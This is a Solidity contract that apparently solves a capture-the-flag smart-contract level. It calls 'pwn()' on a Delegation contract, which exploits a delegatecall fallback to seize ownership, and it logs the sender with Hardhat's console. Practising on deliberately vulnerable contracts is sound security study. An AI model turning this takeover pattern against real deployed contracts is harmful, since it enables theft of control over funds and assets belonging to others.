// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Delegation.sol";
import "hardhat/console.sol";

contract CallDelegation {

  address public owner; // msg.sender
  Delegation delegation;

  constructor(address _delegation) {
    
    delegation = Delegation(_delegation);
    owner = msg.sender;
    console.log("within constructor() of CallDelegation contract", owner);
  }

  function callDelegation() public { // execute when msg.data is not empty and receive is not defined
    console.log("within callDelegation() of CallDelegation contract", tx.origin, msg.sender);
    (bool result,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
    if (result) {
      this;
    }
  }
}
